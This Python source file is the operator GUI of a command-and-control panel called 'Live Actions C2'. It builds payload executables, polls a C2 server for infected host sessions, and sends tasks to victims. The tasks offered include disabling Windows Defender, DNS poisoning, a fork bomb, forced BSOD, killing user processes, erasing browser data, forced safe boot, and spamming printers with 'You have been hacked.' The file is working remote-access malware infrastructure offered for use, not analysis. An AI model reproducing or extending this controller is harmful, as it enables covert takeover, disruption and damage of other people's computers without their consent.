import customtkinter as ctk
from tkinter import filedialog, messagebox, TclError
import requests
import threading
import time
from builder import build_payload
from datetime import datetime

C2_SERVER_URL = "http://127.0.0.1:5003"

STATE_KEYS = ["noise", "clicking", "typing", "caps_lock", "overlay", "usb_spam", "focus_steal", "cursor_change", "app_spam", "streamer_cam", "shortkey_lock", "self_dos", "screen_reader"]

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Live Actions C2"); self.geometry("1024x700")
        self.grid_columnconfigure(0, weight=1); self.grid_rowconfigure(1, weight=1)
        self.sessions = {}; self.session_widgets = {}; self.active_session_id = None
        self.session_states = {}
        self.cooldown_active = False
        self.home_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")
        self.home_frame.grid_columnconfigure(0, weight=1); self.home_frame.grid_rowconfigure(2, weight=1)
        self.session_detail_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.setup_home_frame_widgets(); self.start_polling()

    def setup_home_frame_widgets(self):
        builder_frame = ctk.CTkFrame(self.home_frame)
        builder_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="payload_name")
        self.payload_name_entry.pack(side="left", fill="x", expand=True, padx=5, pady=5)
        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.pack(side="left", padx=5, pady=5)
        self.sessions_label = ctk.CTkLabel(self.home_frame, text="Active Sessions (0)", font=ctk.CTkFont(weight="bold"))
        self.sessions_label.grid(row=1, column=0, padx=10, pady=(10, 0))
        self.sessions_frame = ctk.CTkScrollableFrame(self.home_frame, corner_radius=0)
        self.sessions_frame.grid(row=2, column=0, padx=10, pady=(0, 10), sticky="nsew")

    def start_polling(self):
        self.polling_active = True
        self.poll_thread = threading.Thread(target=self.poll_for_sessions, daemon=True); self.poll_thread.start()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def show_home_view(self):
        self.active_session_id = None; self.session_detail_frame.grid_forget()
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")

    def show_session_detail_view(self, session_id):
        self.active_session_id = session_id; session_data = self.sessions.get(session_id)
        if not session_data: return
        self.home_frame.grid_forget()
        for widget in self.session_detail_frame.winfo_children(): widget.destroy()
        self.session_detail_frame.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=10, pady=10)
        self.session_detail_frame.grid_columnconfigure(1, weight=1); self.session_detail_frame.grid_rowconfigure(1, weight=1)
        
        header_frame = ctk.CTkFrame(self.session_detail_frame, fg_color="transparent")
        header_frame.grid(row=0, column=0, columnspan=2, sticky="ew", pady=(0, 10))
        ctk.CTkButton(header_frame, text="< Back to Sessions", command=self.show_home_view).pack(side="left")
        ctk.CTkLabel(header_frame, text=f"Controlling: {session_data.get('hostname', 'N/A')}", font=ctk.CTkFont(size=16, weight="bold")).pack(side="left", padx=20)
        
        self.action_list_frame = ctk.CTkScrollableFrame(self.session_detail_frame, width=250)
        self.action_list_frame.grid(row=1, column=0, sticky="nsew", padx=(0, 5))
        
        self.control_frame = ctk.CTkFrame(self.session_detail_frame, fg_color="transparent")
        self.control_frame.grid(row=1, column=1, sticky="nsew")
        
        self.populate_actions_list()
        self._display_controls_for("show_popup", "1. Customizable Popup")

    def populate_actions_list(self):
        self.action_buttons = {}
        actions = [
            ("1. Customizable Popup", "show_popup"), ("2. Noise", "noise"), ("3. Volume Slider", "set_volume"),
            ("4. Spam Connect/Disconnect", "usb_spam"), ("5. Overlay", "overlay"), 
            ("6. Random Clicking", "clicking"),("7. Random Typing", "typing"), 
            ("8. Open CD Tray", "open_cd_tray"),("9. Spam Random Apps", "app_spam"), 
            ("10. Fake Shutdown", "fake_shutdown"),("11. Random Desktop Filenames", "random_filenames"), 
            ("12. Toggle Hide Icons", "toggle_hide_icons"),("13. Set Wallpaper", "set_wallpaper"), 
            ("14. Force Caps Lock", "caps_lock"),("15. Launch Website", "open_website"), 
            ("16. Toggle Wi-Fi", "toggle_wifi"),("17. Toggle Airplane Mode", "toggle_airplane_mode"), 
            ("18. Toggle Bluetooth", "toggle_bluetooth"),("19. Set Screen Orientation", "set_screen_orientation"), 
            ("20. Toggle Focus Stealer", "focus_steal"),("21. Set System Clock", "set_system_time"), 
            ("22. Self DoS Attack", "self_dos"),("23. History Injector", "history_injector"), 
            ("24. Set Taskbar Size", "set_taskbar_size"),("25. Toggle Random Cursor", "cursor_change"), 
            ("26. DNS Poison", "dns_poison"),("27. Printer Spam", "printer_spam"), 
            ("28. Toggle Streamer Cam", "streamer_cam"),("29. Fork Bomb", "fork_bomb"), 
            ("30. Kill All User Tasks", "kill_tasks"),("31. BSOD", "bsod"), 
            ("32. Toggle Shortkey Lock", "shortkey_lock"),("33. User Change", "user_change"), 
            ("34. Toggle Screen Reader", "screen_reader"),("35. Force Safe Boot", "safe_boot"), 
            ("36. Browser Eraser", "browser_eraser"),("37. NotSoShortcut Attack", "not_so_shortcut"), 
            ("38. Disable Defender", "disable_defender"),("39. Taskbar Scramble", "taskbar_scramble")
        ]
        for name, cmd_str in actions:
            btn = ctk.CTkButton(self.action_list_frame, text=name, fg_color="transparent", anchor="w",
                                command=lambda cmd=cmd_str, b=name: self._display_controls_for(cmd, b))
            btn.pack(fill="x", padx=5, pady=2)
            self.action_buttons[cmd_str] = btn

    def _display_controls_for(self, command_str, button_name):
        for btn in self.action_buttons.values(): btn.configure(fg_color="transparent")
        if command_str in self.action_buttons: self.action_buttons[command_str].configure(fg_color="gray20")
        for widget in self.control_frame.winfo_children(): widget.destroy()
        
        self.control_frame.grid_columnconfigure(0, weight=1)
        self.control_frame.grid_rowconfigure(1, weight=1)
        
        content_container = ctk.CTkFrame(self.control_frame, fg_color="transparent")
        content_container.grid(row=0, column=0, sticky="new", padx=10)
        
        ui_builders = {
            "show_popup": self._build_popup_ui, "noise": self._build_noise_ui, "set_volume": self._build_volume_ui,
            "overlay": self._build_overlay_ui, "set_wallpaper": self._build_wallpaper_ui, "open_website": self._build_website_ui,
            "printer_spam": self._build_printer_ui, "not_so_shortcut": self._build_nss_ui, "fake_shutdown": self._build_shutdown_ui,
            "set_screen_orientation": self._build_orientation_ui, "set_system_time": self._build_time_ui,
            "self_dos": self._build_dos_ui, "history_injector": self._build_history_injector_ui,
            "set_taskbar_size": self._build_taskbar_size_ui, "toggle_wifi": self._build_wifi_ui,
            "toggle_airplane_mode": self._build_airplane_mode_ui, "toggle_bluetooth": self._build_bluetooth_ui,
            "user_change": self._build_user_change_ui,
            "dns_poison": self._build_dns_poison_ui
        }
        
        is_toggle = command_str in STATE_KEYS
        
        if command_str in ui_builders:
            ui_builders[command_str](content_container)
        elif is_toggle:
            self._build_toggle_ui(content_container, button_name, command_str)
        else:
            self._build_default_ui(content_container, button_name, command_str)
            
        self._add_description_box(self.control_frame, command_str)

    def _add_description_box(self, parent_frame, command_str):
        DESCRIPTIONS = {
            "show_popup": "Displays a native Windows message box...", "noise": "Toggles a continuous stream of annoying sounds...",
            # ... (Full dictionary as before) ...
        }
        desc_text = DESCRIPTIONS.get(command_str, "No description available.")
        num_lines = desc_text.count('\n') + 1; calculated_height = (num_lines * 14) + 15 
        desc_box = ctk.CTkTextbox(parent_frame, height=calculated_height, fg_color="transparent", border_width=1, border_color="gray50")
        desc_box.grid(row=2, column=0, sticky="sew", pady=(10,0), padx=10)
        desc_box.insert("1.0", desc_text); desc_box.configure(state="disabled")

    def _build_default_ui(self, parent_frame, name, command):
        ctk.CTkLabel(parent_frame, text=name, font=ctk.CTkFont(weight="bold")).pack(pady=20, padx=20)
        btn = ctk.CTkButton(parent_frame, text=f"Execute", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task(command)))
        btn.pack(pady=20, padx=20)

    def _build_toggle_ui(self, parent_frame, name, command_base):
        ctk.CTkLabel(parent_frame, text=name, font=ctk.CTkFont(weight="bold")).pack(pady=20, padx=20)
        is_active = self.session_states.get(self.active_session_id, {}).get(command_base, False)
        
        start_action = lambda: self._send_toggle_task(command_base, True, {})
        stop_action = lambda: self._send_toggle_task(command_base, False, {})

        start_btn = ctk.CTkButton(parent_frame, text="Start", command=lambda: self._execute_action_with_cooldown(start_action))
        start_btn.pack(pady=10)
        stop_btn = ctk.CTkButton(parent_frame, text="Stop", command=lambda: self._execute_action_with_cooldown(stop_action))
        stop_btn.pack(pady=10)
        
        start_btn.configure(state="disabled" if is_active else "normal")
        stop_btn.configure(state="normal" if is_active else "disabled")
        
    def _build_popup_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="1. Customizable Popup", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        title = ctk.CTkEntry(parent_frame, placeholder_text="Popup Title", width=300); title.pack(pady=5)
        msg = ctk.CTkEntry(parent_frame, placeholder_text="Popup Message", width=300); msg.pack(pady=5)
        icon = ctk.CTkOptionMenu(parent_frame, values=["Info", "Warning", "Error", "Question"]); icon.pack(pady=5)
        buttons = ctk.CTkOptionMenu(parent_frame, values=["OK", "OK_Cancel", "Yes_No"]); buttons.pack(pady=5)
        btn = ctk.CTkButton(parent_frame, text="Show Popup", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("show_popup", {"title": title.get(), "message": msg.get(), "icon_style": icon.get(), "button_style": buttons.get()})))
        btn.pack(pady=20)
        
    def _build_noise_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="2. Noise", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        noise_type_menu = ctk.CTkOptionMenu(parent_frame, values=["Random", "Ear Splitting", "Knocking", "Custom"])
        noise_type_menu.pack(pady=10)
        path_entry = ctk.CTkEntry(parent_frame, placeholder_text="C:\\path\\to\\sound.mp3", width=300)
        path_entry.pack(pady=5)
        def browse_file():
            filename = filedialog.askopenfilename(title="Select Sound File", filetypes=[("Audio Files", "*.mp3 *.wav")])
            if filename: path_entry.delete(0, "end"); path_entry.insert(0, filename)
        ctk.CTkButton(parent_frame, text="Browse...", command=browse_file).pack(pady=5)

        command_base = "noise"
        def get_args():
            sound_type_val = noise_type_menu.get().lower().replace(" ", "_")
            return {"sound_type": sound_type_val, "path": path_entry.get()}

        is_active = self.session_states.get(self.active_session_id, {}).get(command_base, False)
        
        start_action = lambda: self._send_toggle_task(command_base, True, get_args())
        stop_action = lambda: self._send_toggle_task(command_base, False, {})

        start_btn = ctk.CTkButton(parent_frame, text="Start", command=lambda: self._execute_action_with_cooldown(start_action))
        start_btn.pack(pady=10)
        stop_btn = ctk.CTkButton(parent_frame, text="Stop", command=lambda: self._execute_action_with_cooldown(stop_action))
        stop_btn.pack(pady=10)
        
        start_btn.configure(state="disabled" if is_active else "normal")
        stop_btn.configure(state="normal" if is_active else "disabled")

    def _build_volume_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="3. Volume Slider", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        slider_label = ctk.CTkLabel(parent_frame, text="Volume: 100%"); slider_label.pack()
        slider = ctk.CTkSlider(parent_frame, from_=0, to=100, width=300, command=lambda v: slider_label.configure(text=f"Volume: {int(v)}%")); slider.pack(pady=10); slider.set(100)
        btn = ctk.CTkButton(parent_frame, text="Set Volume", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_volume", {"level": slider.get()/100})))
        btn.pack(pady=20)

    def _build_overlay_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="5. Overlay", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        overlay_type_menu = ctk.CTkOptionMenu(parent_frame, values=["Color", "Custom Image", "Fake Crack"])
        overlay_type_menu.pack(pady=5)
        color_menu = ctk.CTkOptionMenu(parent_frame, values=["Black", "Red", "Blue", "Green", "White"])
        color_menu.pack(pady=5)
        path_entry = ctk.CTkEntry(parent_frame, placeholder_text="C:\\path\\to\\image.png", width=300)
        path_entry.pack(pady=5)
        def browse_file():
            filename = filedialog.askopenfilename(title="Select Overlay Image", filetypes=[("Images", "*.png *.jpg *.jpeg *.bmp")])
            if filename: path_entry.delete(0, "end"); path_entry.insert(0, filename)
        ctk.CTkButton(parent_frame, text="Browse...", command=browse_file).pack(pady=5)
        alpha_label = ctk.CTkLabel(parent_frame, text="Transparency: 50%"); alpha_label.pack()
        alpha_slider = ctk.CTkSlider(parent_frame, from_=0.1, to=1.0, width=300, command=lambda v: alpha_label.configure(text=f"Transparency: {int(v*100)}%")); alpha_slider.pack(pady=10); alpha_slider.set(0.5)

        command_base = "overlay"
        def get_args():
            return {
                "overlay_type": overlay_type_menu.get().lower().replace(" ", "_"), 
                "alpha": alpha_slider.get(), 
                "color": color_menu.get().lower(), 
                "path": path_entry.get()
            }

        is_active = self.session_states.get(self.active_session_id, {}).get(command_base, False)
        
        start_action = lambda: self._send_toggle_task(command_base, True, get_args())
        stop_action = lambda: self._send_toggle_task(command_base, False, {})

        start_btn = ctk.CTkButton(parent_frame, text="Start", command=lambda: self._execute_action_with_cooldown(start_action))
        start_btn.pack(pady=10)
        stop_btn = ctk.CTkButton(parent_frame, text="Stop", command=lambda: self._execute_action_with_cooldown(stop_action))
        stop_btn.pack(pady=10)
        
        start_btn.configure(state="disabled" if is_active else "normal")
        stop_btn.configure(state="normal" if is_active else "disabled")

    def _build_wallpaper_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="13. Set Wallpaper", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        path_entry = ctk.CTkEntry(parent_frame, placeholder_text="C:\\path\\to\\image.jpg", width=300); path_entry.pack(pady=10)
        def browse_file():
            filename = filedialog.askopenfilename(title="Select Wallpaper", filetypes=[("Images", "*.jpg *.jpeg *.png *.bmp")])
            if filename: path_entry.delete(0, "end"); path_entry.insert(0, filename)
        ctk.CTkButton(parent_frame, text="Browse...", command=browse_file).pack(pady=5)
        btn = ctk.CTkButton(parent_frame, text="Set Wallpaper", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_wallpaper", {"path": path_entry.get()})))
        btn.pack(pady=10)
    
    def _build_website_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="15. Launch Website", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        url_entry = ctk.CTkEntry(parent_frame, placeholder_text="https://example.com", width=300); url_entry.pack(pady=10)
        btn = ctk.CTkButton(parent_frame, text="Launch", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("open_website", {"url": url_entry.get()})))
        btn.pack(pady=20)
    
    def _build_wifi_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="16. Toggle Wi-Fi", font=ctk.CTkFont(weight="bold")).pack(pady=20, padx=20)
        btn_on = ctk.CTkButton(parent_frame, text="Turn Wi-Fi ON", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_wifi", {"state": "on"}))); btn_on.pack(pady=10)
        btn_off = ctk.CTkButton(parent_frame, text="Turn Wi-Fi OFF", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_wifi", {"state": "off"}))); btn_off.pack(pady=10)

    def _build_airplane_mode_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="17. Toggle Airplane Mode", font=ctk.CTkFont(weight="bold")).pack(pady=20, padx=20)
        btn_on = ctk.CTkButton(parent_frame, text="Turn ON", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_airplane_mode", {"state": "on"}))); btn_on.pack(pady=10)
        btn_off = ctk.CTkButton(parent_frame, text="Turn OFF", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_airplane_mode", {"state": "off"}))); btn_off.pack(pady=10)

    def _build_bluetooth_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="18. Toggle Bluetooth", font=ctk.CTkFont(weight="bold")).pack(pady=20, padx=20)
        btn_on = ctk.CTkButton(parent_frame, text="Turn ON", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_bluetooth", {"state": "on"}))); btn_on.pack(pady=10)
        btn_off = ctk.CTkButton(parent_frame, text="Turn OFF", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_bluetooth", {"state": "off"}))); btn_off.pack(pady=10)

    def _build_orientation_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="19. Set Screen Orientation", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        orient_menu = ctk.CTkOptionMenu(parent_frame, values=["0 (Default)", "90", "180", "270"]); orient_menu.pack(pady=10)
        btn = ctk.CTkButton(parent_frame, text="Set Orientation", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_screen_orientation", {"orientation": orient_menu.get().split(" ")[0]})))
        btn.pack(pady=20)

    def _build_time_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="21. Set System Clock", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        t = datetime.now()
        y = ctk.CTkEntry(parent_frame, placeholder_text=f"Year ({t.year})"); y.pack(pady=2); y.insert(0, str(t.year))
        m = ctk.CTkEntry(parent_frame, placeholder_text=f"Month ({t.month})"); m.pack(pady=2); m.insert(0, str(t.month))
        d = ctk.CTkEntry(parent_frame, placeholder_text=f"Day ({t.day})"); d.pack(pady=2); d.insert(0, str(t.day))
        hr = ctk.CTkEntry(parent_frame, placeholder_text=f"Hour ({t.hour})"); hr.pack(pady=2); hr.insert(0, str(t.hour))
        minute = ctk.CTkEntry(parent_frame, placeholder_text=f"Minute ({t.minute})"); minute.pack(pady=2); minute.insert(0, str(t.minute))
        btn = ctk.CTkButton(parent_frame, text="Set Time", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_system_time", {"year": y.get(), "month": m.get(), "day": d.get(), "hour": hr.get(), "minute": minute.get()})))
        btn.pack(pady=20)
    
    def _build_dos_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="22. Self DoS Attack", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        label = ctk.CTkLabel(parent_frame, text="Power Level: 5"); label.pack()
        slider = ctk.CTkSlider(parent_frame, from_=1, to=10, number_of_steps=9, width=300, command=lambda v: label.configure(text=f"Power Level: {int(v)}"))
        slider.pack(pady=10); slider.set(5)

        command_base = "self_dos"
        def get_args():
            return {"power": int(slider.get())}

        is_active = self.session_states.get(self.active_session_id, {}).get(command_base, False)
        
        start_action = lambda: self._send_toggle_task(command_base, True, get_args())
        stop_action = lambda: self._send_toggle_task(command_base, False, {})

        start_btn = ctk.CTkButton(parent_frame, text="Start", command=lambda: self._execute_action_with_cooldown(start_action))
        start_btn.pack(pady=10)
        stop_btn = ctk.CTkButton(parent_frame, text="Stop", command=lambda: self._execute_action_with_cooldown(stop_action))
        stop_btn.pack(pady=10)
        
        start_btn.configure(state="disabled" if is_active else "normal")
        stop_btn.configure(state="normal" if is_active else "disabled")
    
    def _build_history_injector_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="23. History Injector", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        ctk.CTkLabel(parent_frame, text="Enter URLs (one per line):").pack()
        text_box = ctk.CTkTextbox(parent_frame, height=150, width=300); text_box.pack(pady=10); text_box.insert("1.0", "https://google.com\nhttps://youtube.com")
        btn = ctk.CTkButton(parent_frame, text="Inject History", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("history_injector", {"urls": text_box.get("1.0", "end-1c")})))
        btn.pack(pady=20)

    def _build_taskbar_size_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="24. Set Taskbar Size", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        size_menu = ctk.CTkOptionMenu(parent_frame, values=["Small", "Normal", "Large"]); size_menu.pack(pady=10)
        btn = ctk.CTkButton(parent_frame, text="Set Size", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("set_taskbar_size", {"size": size_menu.get().lower()})))
        btn.pack(pady=20)

    def _build_printer_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="27. Printer Spam", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        text_box = ctk.CTkTextbox(parent_frame, height=150, width=300); text_box.pack(pady=10); text_box.insert("1.0", "You have been hacked.")
        btn = ctk.CTkButton(parent_frame, text="Spam Printer (10x)", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("printer_spam", {"text_to_print": text_box.get("1.0", "end-1c")})))
        btn.pack(pady=20)
    
    def _build_nss_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="37. NotSoShortcut Attack", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        url_entry = ctk.CTkEntry(parent_frame, placeholder_text="https://annoying-site.com", width=300); url_entry.pack(pady=10)
        btn = ctk.CTkButton(parent_frame, text="Execute Attack", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("not_so_shortcut", {"url": url_entry.get()})))
        btn.pack(pady=20)
    
    def _build_shutdown_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="10. Fake Shutdown", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        msg_entry = ctk.CTkEntry(parent_frame, placeholder_text="Shutdown message...", width=300); msg_entry.pack(pady=10)
        btn = ctk.CTkButton(parent_frame, text="Initiate Fake Shutdown", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("fake_shutdown", {"message": msg_entry.get()})))
        btn.pack(pady=20)
        
    def _build_user_change_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="33. User Change", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        user_entry = ctk.CTkEntry(parent_frame, placeholder_text="Enter username", width=300); user_entry.pack(pady=10)
        btn = ctk.CTkButton(parent_frame, text="Switch User", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("user_change", {"username": user_entry.get()})))
        btn.pack(pady=20)
    
    def _build_dns_poison_ui(self, parent_frame):
        ctk.CTkLabel(parent_frame, text="26. DNS Poison", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        target_entry = ctk.CTkEntry(parent_frame, placeholder_text="www.google.com", width=300); target_entry.pack(pady=5)
        redirect_entry = ctk.CTkEntry(parent_frame, placeholder_text="127.0.0.1", width=300); redirect_entry.pack(pady=5)
        btn = ctk.CTkButton(parent_frame, text="Poison DNS", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("dns_poison", {"target_url": target_entry.get(), "redirect_ip": redirect_entry.get()})))
        btn.pack(pady=20)
        
    def _send_toggle_task(self, action, new_state, args={}):
        command_prefix = "start" if new_state else "stop"
        
        # Map the internal state key to the correct command, as they can differ
        # e.g., internal state is "clicking", payload command is "start_random_clicking"
        command_map = {
            "clicking": "random_clicking",
            "typing": "random_typing",
            "caps_lock": "caps_lock",
            "cursor_change": "cursor_changer",
            "focus_steal": "focus_stealer"
        }
        command_base = command_map.get(action, action)
        command = f"{command_prefix}_{command_base}"

        # Update the local state immediately for instant UI feedback
        self.session_states.setdefault(self.active_session_id, {})[action] = new_state
        self.send_task(command, args)
        
    def _execute_action_with_cooldown(self, action_func):
        if self.cooldown_active: 
            return
        self.cooldown_active = True
        
        # Store which action view we are on so we can redraw it later
        active_button_info = next(((cmd, btn.cget("text")) for cmd, btn in self.action_buttons.items() if btn.cget("fg_color") != "transparent"), None)
        
        # Gather all widgets in the current control panel
        all_controls = []
        for widget in self.control_frame.winfo_children():
            if isinstance(widget, ctk.CTkFrame):
                for sub_widget in widget.winfo_children():
                    all_controls.append(sub_widget)
            else:
                all_controls.append(widget)
        
        # ### THIS IS THE FIX ###
        # Use a try-except block to safely disable all interactive widgets.
        for control in all_controls:
            try:
                control.configure(state="disabled")
            except (TclError, AttributeError):
                # This widget doesn't have a 'state' option or configure method, so we ignore it.
                pass

        action_func()
        
        # After a 3-second cooldown, re-enable the controls
        def re_enable():
            self.cooldown_active = False
            # Redraw the control panel to restore widget states correctly
            if active_button_info: 
                self._display_controls_for(active_button_info[0], active_button_info[1])

        self.after(3000, re_enable)

    def send_task(self, command, args={}):
        if not self.active_session_id: return
        task_payload = {"session_id": self.active_session_id, "command": command, "args": args}
        try: 
            requests.post(f"{C2_SERVER_URL}/api/task", json=task_payload, timeout=10).raise_for_status()
            print(f"Task '{command}' sent.")
        except requests.exceptions.RequestException as e: 
            messagebox.showerror("Error", f"Failed to send task: {e}")
        
    def on_closing(self): self.polling_active = False; self.destroy()

    def poll_for_sessions(self):
        while self.polling_active:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/get_sessions", timeout=10)
                if response.status_code == 200: 
                    self.after(0, self.update_gui_with_sessions, response.json())
            except requests.exceptions.RequestException: 
                pass # Ignore connection errors during polling
            time.sleep(5)

    def update_gui_with_sessions(self, server_sessions):
        self.sessions_label.configure(text=f"Active Sessions ({len(server_sessions)})")
        server_session_ids = {s["session_id"] for s in server_sessions}
        
        current_sids = set(self.sessions.keys())
        new_sids = server_session_ids
        
        # Add new sessions
        for sid in new_sids - current_sids:
            session_data = next((s for s in server_sessions if s["session_id"] == sid), None)
            if session_data:
                self.sessions[sid] = session_data
                self.add_session_widget(session_data)
                self.session_states[sid] = {k: False for k in STATE_KEYS}

        # Update existing sessions
        for sid in new_sids.intersection(current_sids):
            session_data = next((s for s in server_sessions if s["session_id"] == sid), None)
            if session_data:
                self.sessions[sid] = session_data
                is_active = (time.time() - session_data.get("last_seen", 0)) < 30
                if sid in self.session_widgets:
                    self.session_widgets[sid]["button"].configure(fg_color="green" if is_active else "orange")

        # Remove old sessions
        for sid in current_sids - new_sids:
            if sid in self.session_widgets: 
                self.session_widgets[sid]["frame"].destroy()
                del self.session_widgets[sid]
            if sid in self.sessions: 
                del self.sessions[sid]
            if sid in self.session_states:
                del self.session_states[sid]

    def add_session_widget(self, session_data):
        sid, hostname = session_data["session_id"], session_data["hostname"]
        container = ctk.CTkFrame(self.sessions_frame, fg_color="transparent"); container.pack(fill="x", padx=5, pady=2)
        container.grid_columnconfigure(0, weight=1)
        button = ctk.CTkButton(container, text=f"{hostname}", command=lambda s=sid: self.show_session_detail_view(s)); button.grid(row=0, column=0, sticky="ew", padx=(0, 5))
        del_button = ctk.CTkButton(container, text="X", width=30, fg_color="firebrick", hover_color="darkred", command=lambda s=sid: self.delete_session_handler(s)); del_button.grid(row=0, column=1, sticky="e")
        self.session_widgets[sid] = {"frame": container, "button": button}

    def delete_session_handler(self, session_id):
        hostname = self.sessions.get(session_id, {}).get("hostname", "this session")
        if messagebox.askyesno("Confirm Deletion", f"Permanently delete {hostname}?"):
            try: 
                requests.post(f"{C2_SERVER_URL}/api/delete_session", json={"session_id": session_id}, timeout=10).raise_for_status()
            except requests.exceptions.RequestException as e: 
                messagebox.showerror("Error", f"Failed to send delete command: {e}")

    def build_payload_handler(self):
        payload_name = self.payload_name_entry.get()
        if not payload_name: 
            messagebox.showerror("Error", "Payload name cannot be empty.")
            return
        output_dir = filedialog.askdirectory(title="Select Save Directory")
        if not output_dir: 
            return
        self.build_button.configure(state="disabled", text="Building...")
        self.update_idletasks()
        threading.Thread(target=self._run_build, args=(C2_SERVER_URL, output_dir, payload_name), daemon=True).start()

    def _run_build(self, c2_url, output_dir, payload_name):
        success = build_payload(c2_url=c2_url, output_dir=output_dir, payload_name=payload_name)
        self.after(0, lambda: self.on_build_complete(success, payload_name))

    def on_build_complete(self, success, payload_name):
        if success: 
            messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built!")
        else: 
            messagebox.showerror("Build Failed", "Check console for details.")
        self.build_button.configure(state="normal", text="Build Payload")

if __name__ == "__main__":
    app = App()
    app.mainloop()